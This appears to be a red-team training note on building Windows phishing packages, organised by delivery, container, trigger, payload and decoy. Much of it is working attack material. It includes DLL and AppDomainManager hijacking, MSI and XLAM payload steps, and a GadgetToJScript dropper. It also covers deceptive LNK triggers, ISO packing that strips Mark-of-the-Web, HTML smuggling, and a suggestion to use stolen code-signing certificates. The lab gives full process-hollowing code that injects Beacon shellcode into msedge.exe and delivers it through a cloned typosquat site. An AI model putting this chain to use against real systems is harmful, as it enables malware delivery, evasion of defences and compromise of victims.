[Mariusz Banach](https://x.com/mariuszbit) proposes a taxonomy for phishing payloads based on real-world observations of adversary behaviour.  He represents it as `DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY))` where:
	_Delivery_ is the technique used to deliver the package to the victim.
	_Container_ is the container format used to package the files.
	_Trigger_ is the means to trigger payload execution.
	_Payload_ is the malicious code to execute.
	_Decoy_ is a file to display to the victim.

[DLL-Template](https://github.com/FuzzySecurity/DLL-Template/tree/master/DLL-Template) Use this for premade DLLs

Another way to view this:
```
Delivery
	Container
		Trigger
		Payload (or Dropper)
		Decoy
```
## Payloads
The _payload_ and _decoy_ are arguably the most important parts of your infection chain. If the trigger is a pdf file, the decoy should also be a PDF document.
#### DLL side-loading / hijacking
Technique used to force legitimate app into loading malicious DLL. This abuses the Windows DLL search order when an app tries to load dependencies:

Search Order
```
- The directory the application is in.
- The system directory, typically `C:\Windows\System32`.
- The 16-bit system directory, typically `C:\Windows\System`.
- The Windows directory, typically `C:\Windows`.
- The current working directory.
- The directories that are listed in the `PATH` environment variable.
```

Finding Hijack Opportunities
```
Run ProcMon

Filter
	path ends in .dll

Run executable

What are we looking for?
	Result = NAME NOT FOUND
	Path = <a directory we can modify>

What next?
	Drop a malicious DLL in the location identified
```

Example of what we are looking for
Old Version of ngentask.exe located in Windows Component Store `C:\Windows\WinSxS`
![[Pasted image 20251218201710.png]]

Next, drop a malicious DLL
You can write your own test DLL or use one that someone has already published, such as [this one](https://github.com/FuzzySecurity/DLL-Template) by [Ruben Boonen](https://x.com/FuzzySec).

#### AppDomainManager
There are also methods of forcing .NET applications into loading DLLs regardless of the search order.  [Startup hooks](https://rastamouse.me/net-startup-hooks/) can be utilised for apps written in .NET Core 3.1 or higher.

Abusing [AppDomainManager](https://learn.microsoft.com/en-us/dotnet/api/system.appdomainmanager?view=netframework-4.8.1) 
```C#
// Custom DLL
using System;
using System.Windows.Forms;

namespace AppDomainHijack;

public sealed class DomainManager : AppDomainManager // Custom class that inherits from AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        MessageBox.Show("Hello World", "Success"); // OUR STUFF GOES HERE
    }
}
```
```powershell
# Compile into DLL
csc.exe /target:library /out:AppDomainHijack.dll AppDomainHijack.cs # or just use VS

# Ensure DLL and .NET app are in same directory
cp AppDomainHijack.dll /path/to/domainManager.dll
cp Vulnerable.exe /path/to/Vulnerable.exe

# 2 ways to have app load the DLL
1. Set environment variables, then run app
   > $env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
   > $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
   > .\Vulnerable.exe

2. Create .config file, then run # config name must MATCH, ie: vulnerable.exe.config, AND must be in same directory
```
```XML
<configuration>
   <runtime>
      <appDomainManagerAssembly value="AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />  
      <appDomainManagerType value="AppDomainHijack.DomainManager" />  
   </runtime>
</configuration>
```

#### Windows Installer
Windows Installer, aka MSI, is an installer format created by Microsoft. They store the files to be installed as well as the required installation steps, so they may also act as containers in the initial access taxonomy.
###### Steps
Create MSI
	[Visual Studio](https://visualstudio.microsoft.com/) > [Installer Projects](https://marketplace.visualstudio.com/items?itemName=VisualStudioClient.MicrosoftVisualStudio2022InstallerProjects) extension > Create a new project > Setup Project
	![[Pasted image 20251218221534.png]]

Add Payload Dependencies
	Choose from App Folder, User's Desktop, OR Start Menu
	Right Click > Add > File > `<Payload>`
	![[Pasted image 20251218221545.png]]

Modify Properties (as needed)
	Hidden = True `# hides files after dropped on machine`
	![[Pasted image 20251218221555.png]]

Modify Actions so payload executes during installation
	Right click project in Solution Explorer
	View > Custom Actions
		![[Pasted image 20251218221619.png]]
	Right Click `Install` step
	Select `Add Custom Action`
	Select folder chosen earlier in Payload Dependencies step
	Select payload file
		![[Pasted image 20251218221523.png]]
	Depending on architecture of payload, adjust `Run64Bit` in action properties
	Adjust arguments
		![[Pasted image 20251218221809.png]]

Modify project properties to dress up installer with pseudo company info
	![[Pasted image 20251218221940.png]]

Build Project
	Build > Build Solution
	Should get two files - `.exe` and `.msi`
		![[Pasted image 20251218222107.png]]
		.exe is just a wrapper and does NOT need to be included when delivering to a victim


#### Excel Add-In's
An `.xlam` file is a macro-enabled Excel Add-In, designed to add custom functionality to Excel. 

The main challenge with using macros for initial access is `Protected View` 
	Disables macros when opening a file that:
		Has MotW (Mark-of-the-Web)
		Was received as an email attachment
		Opened from an untrusted location
	We can strip MotW with appropriate container, and bypass trusted location issue

Default trusted locations in Trust Center
```
- %ProgramFiles%\Microsoft Office\root\Office16\Library\
- %ProgramFiles%\Microsoft Office\root\Office16\STARTUP\
- %ProgramFiles%\Microsoft Office\root\Office16\XLSTART\
- %ProgramFiles%\Microsoft Office\root\Templates\
- %APPDATA%\Microsoft\Excel\XLSTART\
- %APPDATA%\Microsoft\Templates\
```
We can't write to `%ProgramFiles%` as a standard user, but we can to `%APPDATA%`

###### XLAM Creation
Create new empty workbook

Open VB editor - `Alt + F11`
	Right Click on VBAProject > Insert > Module
		![[Pasted image 20251218223824.png]]

Add macro code - See [[0 Exploiting Microsoft Office]] for a primer
```
Private Sub Auto_Open()
   MsgBox "Hello World", vbOKOnly, "pwned"
End Sub
```

Close Editor

Save File
	File > Save As > Save as `*.xlam`
	After selecting Add-In type, it will switch to `C:\Users\Attacker\AppData\Roaming\Microsoft\AddIns`.  Save it somewhere elsesuch as `C:\Payloads`.

Copy File into `%APPDATA%\Microsoft\Excel\XLSTART

Close and reopen Excel
	![[Pasted image 20251218225147.png]]

#### Code Signing
Code signing is a significant topic when it comes to initial access because they form part of the trust model for technologies like SmartScreen.

Files that have been signed by a trusted authority:
	Produce fewer or zero security alerts
	Are favored by AV / EDR products

Two main types of code-signing certificates:
	Standard 
		Adds signatures that assure users that files haven't been tampered with
	Extended Validation (EV) 
		Makes publisher identity trusted by SmartScreen
	![[Pasted image 20251218225627.png]]

How to obtain EV code-signing cert
	Buy it from DigiCert or GlobalSign 
		ew, "MyRedTeamCompany" will get burnt fast
	Set up and maintain dummy/shell companies
		a lot of time and effot
	Use leaked / stolen certs
		GitHub has a path qualifier that can be used to find certificates that have been committed to public repositories
		You may also search public S3 buckets, game hacking forums, and other places.

## Droppers
Many initial access campaigns do not package the payload in the container directly, opting to use a 'dropper' instead.

_Dropper_ - Program that delivers another program
	Purpose:
		Evade AV
		Complicate analysis of infection chain

For this scenario, we will use [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript) to create JavaScript dropper out of .NET assembly.
#### Creating Droppers

Create **.NET Framework** (NOT .NET Core) Class Library project in Visual Studio
	![[Pasted image 20251219193254.png]]

Empty `Class1.cs` will be created
```C#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
  
namespace MyDropper
{
    public class Class1
    {
    }
}
```

Rename `Class.cs` to `Dropper.cs` (not required)

Right-click on project in Solution Explorer
	Add > Existing Item
	Select Payload file to embed in the dropper
	Properties
		Change Build Action to Embedded Resource
		![[Pasted image 20251219193855.png]]

For [G2JS](https://github.com/med0x2e/GadgetToJScript) to work properly, all the C# code needs to be inside the class constructor
```C#
using System.Reflection;
  
namespace MyDropper
{
    public class Dropper
    {
        public Dropper()
        {
            // use reflection to get reference to own assembly
            var assembly = Assembly.GetExecutingAssembly();
  
            // read embedded payload
            using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.exe")) // Resource MUST be prefixed by project's namespace
            {
                // do something
            }
        }
    }
}
```

Once payload has been read, we drop to disk
	Malicious code in user's home directory is a bad idea (OPSEC)
	These are good options
		`C:\Program Files\*` 
		`C:\Program Files (x86)\*`
		`C:\ProgramData\*` - GREAT CHOICE; writable by standard users
		`C:\Windows\*`
	
Create new directory and drop the payload in there
```C#
using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.exe"))
{
    // get path to ProgramData
    var path = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
    
    // construct new path with our dir name
    var newPath = Path.Combine(path, "MyLegitApp");
    
    // create new directory inside ProgramData
    var newDir = Directory.CreateDirectory(newPath);
  
    // construct path for the executable
    var filePath = Path.Combine(newDir.FullName, "MyApp.exe");
    
    // drop the path to disk
    using (var fs = File.Create(filePath))
    {
        // copy resource stream into file stream
        rs.CopyTo(fs);
  
        // close file
        rs.Close();
    }
}
```

Dropper can also execute payload after it has been written to disk
```C#
// execute it
Process.Start(filePath);
```

Build project
	Release Mode
		![[Pasted image 20251220153935.png]]
	Build Solution
		![[Pasted image 20251220153418.png]]
	Produces `MyDropper.dll` in `.\source\repos\MyDropper\bin\Release\

Serialize using GadgetToJScript
```PowerShell
.\GadgetToJScript.exe -a C:\Users\Attacker\source\repos\MyDropper\bin\Release\MyDropper.dll -w js -b -o C:\Payloads\dr
	# -w = type of script to output
	# -b = bypasses type check controls in .NET 4.8+
	# -o = output path
```

Execute to verify
	Open Cobalt Strike
		use `wscript C:\Path\to\dropper.js` from command prompt
		or
		double click
		![[Pasted image 20251219200338.png]]
	Verification
		![[Pasted image 20251220154730.png]]

If we packed this into a container, we could have a chain that could resemble 
	ISO -> LNK -> JS -> .NET DLL -> EXE
## Decoy
This section will mainly be examples and I will add more later...

If the trigger is a pdf file, the decoy should also be a PDF document.
#### Decoy workbook example
Open excel
	Blank Workbook
		if excel doesnt work, use code block in admin powershell terminal, then retry opening excel
```powershell
& 'C:\Program Files\Microsoft Office\Office16\OSPPREARM.EXE'
```

Add dummy data
```xlsx
id  product      discount  code
1   Prodder      56%       54473-150
2   Viva         9%        0378-5713
3   Aerified     22%       43742-0187
4   Zaam-Dox     26%       35356-687
5   Rank         41%       63323-300
6   Pannier      61%       50804-302
7   Wrapsafe     32%       67046-223
8   Voltsillam   58%       55910-721
9   Ventosanzap  4%        0485-0051
10  Otcom        54%       36987-2281
```

Save workbook in same directory as the payload/dropper and trigger
## Triggers
The _trigger_ is the file that the user will interact with after extracting the container.  You typically want this to be as 'pain-free' as possible, like a double-click.
#### Batch
A very simple BAT
```Batch
@echo off
start payload.exe
start decoy.pdf
exit
```
Notes:
	`@echo off` prevents commands being visible but NOT output
	If we need to mask output, use: `> nul 2>&1` at end of command
###### Change BAT File Behavior
[Trick](https://x.com/vmray/status/1808903062926315690) to allow BAT file to change behavior if it was double-clicked vs command line
```Batch
# include this in BAT script if you want it
# EXAMPLE

@echo off
echo %cmdcmdline% | find /i "%~f0" || exit
calc
exit
```
Notes:
	When double-clicking, the .bat will execute
	When run from command-prompt, it wont work

#### Shell Link
A shell link is a binary file format for Windows shortcuts.  

One of the most deceptive triggers.

Why?
	`.lnk` extension does not show in Explorer, even when 'show file extensions' is enabled
		`report.pdf.lnk` shows as `report.pdf`
	Can be customized to have any icon
		could link to cmd.exe but have pdf icon

###### Create Link

**WScript.Shell** COM object via PowerShell method
```PowerShell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\trigger.pdf.lnk")
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start payload.exe && start decoy.pdf"
$lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
$lnk.Save()
```

Excel Add-In payload arguments
```PowerShell
$lnk.Arguments = "/C xcopy /H macros.xlam %APPDATA%\Microsoft\Excel\XLSTART\ && attrib -H %APPDATA%\Microsoft\Excel\XLSTART\macros.xlam && start sales.xlsx"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()
```

#### Microsoft Saved Console
Automated tool - [MSC_Dropper](https://github.com/ZERODETECTION/MSC_Dropper)
	generate basic MSC payloads


`.msc` file
An example MSC can be found [here](https://gist.github.com/joe-desimone/2b0bbee382c9bdfcac53f2349a379fa4) . Weaponized paylaod on line 105
	URL encode using tool like [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)&input=PD94bWwgdmVyc2lvbj0nMS4wJz8%2BDQo8c3R5bGVzaGVldA0KICAgIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L1hTTC9UcmFuc2Zvcm0iIHhtbG5zOm1zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOnhzbHQiDQogICAgeG1sbnM6dXNlcj0icGxhY2Vob2xkZXIiDQogICAgdmVyc2lvbj0iMS4wIj4NCiAgICA8b3V0cHV0IG1ldGhvZD0idGV4dCIvPg0KICAgIDxtczpzY3JpcHQgaW1wbGVtZW50cy1wcmVmaXg9InVzZXIiIGxhbmd1YWdlPSJWQlNjcmlwdCI%2BDQogICAgPCFbQ0RBVEFbDQogICAgICAgIFNldCB3c2hzaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQogICAgICAgIHdzaHNoZWxsLnJ1biAiQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxjbWQuZXhlIg0KXV0%2BPC9tczpzY3JpcHQ%2BDQo8L3N0eWxlc2hlZXQ%2B&ieol=CRLF&oeol=CRLF)
```xml
xsl.loadXML(unescape("<ENCODED SCRIPT HERE>"))
```


Similar payload to spawn cmd.exe
```xml
<?xml version='1.0'?>
<stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <output method="text"/>
    <ms:script implements-prefix="user" language="VBScript">
    <![CDATA[
        Set wshshell = CreateObject("WScript.Shell")
        wshshell.run "C:\\Windows\\System32\\cmd.exe"
]]></ms:script>
</stylesheet>
```

## Containers
Mark of the Web
	Zone Identifier to mark files that have been downloaded from the internet as potentially unsafe. Shown in properties or PowerShell (ZoneId=3)
	![[Pasted image 20251219214957.png]]

Containers provide a means of bundling your dependencies (trigger, payload, and decoy) into a single files
	Simplifies process of sending multiple files to a victim

Solid Choices
```bash
# Natively supported by Windows
ISO/IMG
ZIP
WIM

# Solid but may require software to interact with
7z
Gz
WinRAR
```

Can pack files manually
	or...
[PackMyPayload](https://github.com/mgeeky/PackMyPayload)
	Some of these container formats support hidden files, and some do not propagate MotW.  [This repository](https://github.com/nmantani/archiver-MOTW-support-comparison) by [Nobutaka Mantani](https://x.com/nmantani) contains a comparison of MotW propagations.

```
NOTE: WSL is super useful here so we can use PackMyPayload within same system...
```

###### PackMyPayload Examples
Before all of these examples, lets use WSL
```powershell
WSL.exe
```
or
	in the downwards carrot in terminal, you can select Ubuntu as a new tab

Basic Packing Scenario
```bash
# Pack pdf executable into ISO
python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py test.pdf test.iso

# host
python3 -m http.server 8000

# pull
iwr -Uri http://localhost:8000/test.iso -OutFile test2.iso
```
Once mounted, we see MotW is gone
	![[Pasted image 20251219220732.png]]

Packing Scenario w/ hidden attributes
```bash
# For example, we have 3 files
ls -l /mnt/c/Payloads/xlam

-rwxrwxrwx 1 rasta rasta 11607 Jun 27 13:55 decoy.xlsx
-rwxrwxrwx 1 rasta rasta 12906 Jun 27 13:55 payload.xlam
-rwxrwxrwx 1 rasta rasta  2094 Jun 28 13:55 trigger.xls.lnk

# Pack into IMG file while hiding decoy.xlsx and payload.xlam
python3 PackMyPayload.py -H decoy.xlsx,payload.xlam /mnt/c/Payloads/xlam /mnt/c/Payloads/xlam/package.img

# host
python3 -m http.server 8000

# pull
iwr -Uri http://localhost:8000/package.img -OutFile test.img
```
Now there is only 1 file ;)

## Delivery
_Delivery_ is the method by which you get the victim to download your initial access package.  This used to be as simple as sending a link or attachment, but as defenses have become more capable these tactics are no longer sufficient.

```
NOTE: The smuggling techniques describes below are often dependent on the red team building a legit looking website and manually backdooring one (or more) pages with smuggling code.
```
#### HTML Smuggling
HTML smuggling is a means of leveraging modern HTML5 and JavaScript features to sneak files past traditional content filters.

How?
	Works by encoding file in HTML content itself and using JS to decode and download to victim

Sample Template
```HTML
<html>
    <head>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/brands.min.css">
    </head>
    <body>
        <button class="btn" onclick="downloadFile()"><i class="fa fa-download"></i> Download</button>

        <script>
            function convertFromBase64(base64) {
                let binary_string = window.atob(base64);
                let len = binary_string.length;
                let bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) {
                    bytes[i] = binary_string.charCodeAt(i);
                }
                return bytes.buffer;
            }

            function downloadFile() {
                const file = 'VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
                const fileName = 'test.txt';
                let data = convertFromBase64(file);
                let blob = new Blob([data], {type: 'octet/stream'});
                if (window.navigator.msSaveOrOpenBlob) {
                    window.navigator.msSaveBlob(blob,fileName);
                }
                else {
                    const a = document.createElement('a');
                    document.body.appendChild(a);
                    a.style = 'display: none';
                    const url = window.URL.createObjectURL(blob);
                    a.href = url;
                    a.download = fileName;
                    a.click();
                    window.URL.revokeObjectURL(url);
                }
            }
        </script>
    </body>
</html>
```
The Base64 encoding in `file` var is arbitrary -- we could use the [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API) to AES-encrypt the file content and [obfuscate](https://javascriptobfuscator.com/Javascript-Obfuscator.aspx) the JavaScript for instance

#### SVG Smuggling
This is a similar technique to HTML smuggling but leverages the SVG format instead. SVG also allows for embedded JS.

Sample Template
```Scala
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="40" stroke="black" stroke-width="4" fill="none" />
<script>
    alert('Hello World');
</script>
Sorry, your browser does not support inline SVG.
</svg> 
```
SVGs can be embedded into HTML or saved as standalones (`.svg`)



#### Cobalt Strike Site Clone
Cobalt Strike has its own drive-by capabilities, although it doesn't use smuggling.  It can clone a legitimate website and then embed a URL that the target's browser will automatically download without needing a user to click anything on the page.

###### Steps
Host file to download on Cobalt Strikes internal web server
	Site Management > Host File
	![[Pasted image 20251220141748.png]]

Verify hosted file
	Site Management > Manage
	![[Pasted image 20251220141840.png]]

Clone Site
	Management > Clone Site
	![[Pasted image 20251220143343.png]]
	Clone URL - Actual page to clone
	Local URL - URI the team server will host the cloned page on
		ideally match the URI of the page we are cloning
	Log keystrokes - Send any key presses on cloned site to Cobalt Strike web log

Send URL to user
	Once they visit, the payload will automatically download

How does this work?
	A hidden iframe in the cloned page
```
<IFRAME SRC="http://www.bleepincomputer.com:80/dl/windows/utilities/system-information/g/gpu-z/GPU-Z.2.22.0.exe?id=null" WIDTH="0" HEIGHT="0"></IFRAME>
```

## Lab
The objective for this lab is to create an initial access package that will inject Beacon shellcode into Microsoft Edge - this is intended to disguise the origin of the outbound HTTP C2 traffic. The shellcode will be embedded into a .NET assembly which will then be serialised into JScript. You will use a LNK file to trigger the payload and display the decoy.
#### Creating the Payload:
Visual Studio > New project > Search Class Library > select the .NET framework C# one

Name MyDropper
Check (place solution and project in the same direction)

Create

In the Lab, we create a dropper using the following code with Visual Studio (Process Hollowing from Malware Essentials)
```C#
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
 
namespace MyDropper
{
    public class Dropper
    {
        public Dropper()
        {
            var si = new STARTUPINFOA
            {
                cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
            };
 
            // create hidden + suspended msedge process
            var success = CreateProcessA(
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
                ref si,
                out var pi);
 
            if (!success)
                return;
 
            // get basic process information
            var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
            var lpPbi = Marshal.AllocHGlobal(szPbi);
 
            NtQueryInformationProcess(
                pi.hProcess,
                PROCESSINFOCLASS.ProcessBasicInformation,
                lpPbi,
                (uint)szPbi,
                out _);
 
            // marshal data to structure
            var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
            Marshal.FreeHGlobal(lpPbi);
 
            // calculate pointer to image base address
            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
 
            // buffer to hold data, 64-bit addresses are 8 bytes
            var bImageBaseAddress = new byte[8];
 
            // read data from spawned process
            ReadProcessMemory(
                pi.hProcess,
                lpImageBaseAddress,
                bImageBaseAddress,
                8,
                out _);
 
            // convert address bytes to pointer
            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
 
            // read pe headers
            var data = new byte[512];
 
            ReadProcessMemory(
                pi.hProcess,
                baseAddress,
                data,
                512,
                out _);
 
            // read e_lfanew
            var e_lfanew = BitConverter.ToInt32(data, 0x3C);
 
            // calculate rva
            var rvaOffset = e_lfanew + 0x28;
            var rva = BitConverter.ToUInt32(data, rvaOffset);
 
            // calculate address of entry point
            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
 
            // read the shellcode
            byte[] shellcode;
 
            var assembly = Assembly.GetExecutingAssembly();
 
            using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.xprocess.bin"))
            {
                // convert stream to raw byte[]
                using (var ms = new MemoryStream())
                {
                    rs.CopyTo(ms);
                    shellcode = ms.ToArray();
                }
            }
 
            // copy shellcode into address of entry point
            WriteProcessMemory(
                pi.hProcess,
                lpEntryPoint,
                shellcode,
                shellcode.Length,
                out _);
 
            // resume process
            ResumeThread(pi.hThread);
        }
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool CreateProcessA(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            PROCESS_CREATION_FLAGS dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFOA lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);
 
        [DllImport("ntdll.dll", ExactSpelling = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern uint NtQueryInformationProcess(
            IntPtr processHandle,
            PROCESSINFOCLASS processInformationClass,
            IntPtr processInformation,
            uint processInformationLength,
            out uint returnLength);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            UInt64 nSize,
            out uint lpNumberOfBytesRead);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out int lpNumberOfBytesWritten);
 
        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern uint ResumeThread(IntPtr hThread);
    }
 
    [Flags]
    public enum PROCESS_CREATION_FLAGS : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_SECURE_PROCESS = 0x00400000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
    }
 
    public struct STARTUPINFOA            
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public STARTUPINFO_FLAGS dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
 
    [Flags]
    public enum STARTUPINFO_FLAGS : uint
    {
        STARTF_FORCEONFEEDBACK = 0x00000040,
        STARTF_FORCEOFFFEEDBACK = 0x00000080,
        STARTF_PREVENTPINNING = 0x00002000,
        STARTF_RUNFULLSCREEN = 0x00000020,
        STARTF_TITLEISAPPID = 0x00001000,
        STARTF_TITLEISLINKNAME = 0x00000800,
        STARTF_UNTRUSTEDSOURCE = 0x00008000,
        STARTF_USECOUNTCHARS = 0x00000008,
        STARTF_USEFILLATTRIBUTE = 0x00000010,
        STARTF_USEHOTKEY = 0x00000200,
        STARTF_USEPOSITION = 0x00000004,
        STARTF_USESHOWWINDOW = 0x00000001,
        STARTF_USESIZE = 0x00000002,
        STARTF_USESTDHANDLES = 0x00000100
    }
 
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
 
    public enum PROCESSINFOCLASS
    {
        ProcessBasicInformation = 0
    }
 
    public struct PROCESS_BASIC_INFORMATION
    {
        public uint ExitStatus;
        public IntPtr PebBaseAddress;
        public ulong AffinityMask;
        public int BasePriority;
        public ulong UniqueProcessId;
        public ulong InheritedFromUniqueProcessId;
    }
}

```

Add `http_x64.xprocess.bin` from C:\Payloads to MyDropper as existing item
	Set embedded resource as build action 

Serializing the DLL
```PowerShell
PS C:\Users\Attacker\source\repos\MyDropper\bin\Release> C:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\GadgetToJScript.exe -a .\MyDropper.dll -w js -b -o C:\Payloads\deals\deals
[+]: Generating the js payload
[+]: First stage gadget generation done.
[+]: Loading your .NET assembly:.\MyDropper.dll
[+]: Second stage gadget generation done.
[*]: Payload generation completed, check: C:\Payloads\deals\deals.js
```

Verify with wscript works
```powershell
# first start up cobalt strike
wscript C:\Payloads\deals\deals.js
```
#### Creating the Decoy:
See Decoy section, this is what i did in the lab

#### Creating the Trigger:
Create shortcut that executes payload and opens the decoy
```PowerShell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start deals.xlsx && wscript deals.js"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()
```

![[Pasted image 20251220162600.png]]

#### Creating the Container:
```bash
wsl.exe

python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,deals.js /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso

```



#### Delivery
- Host the ISO on Cobalt Strike's built-in web server.
    
    1.  Go to **Site Management > Host File**.
    2.  File: C:\Payloads\deals\deals.iso
    3.  Local URI: /deals.iso
    4.  Local Host: www.bleepincomputer.com
    5.  Click **Launch**.
-  Clone a legitimate web page (**Site Management > Clone Site**).
    
    1.  Clone URL: https://deals.bleepingcomputer.com
    2.  Local URI: /deals
    3.  Local Host: www.bleepincomputer.com
    4.  Attack: _deals.iso_
    5.  Click **Clone**.
-  Switch over to [Workstation 1](https://labclient.labondemand.com/Instructions/7cbfc2c3-cc30-453e-985d-00c8f261db7f#) and login with Passw0rd!.
    
-  Open Microsoft Edge and browse to http://www.bleepincomputer.com/deals
    
-  Click _Open file_ when deals.iso downloads.
    
-  Double-click on _deals.xlsx_ and the decoy will open.
    
-  Switch back to [Attacker Desktop](https://labclient.labondemand.com/Instructions/7cbfc2c3-cc30-453e-985d-00c8f261db7f#) and a Beacon should be checking in from msedge.exe.

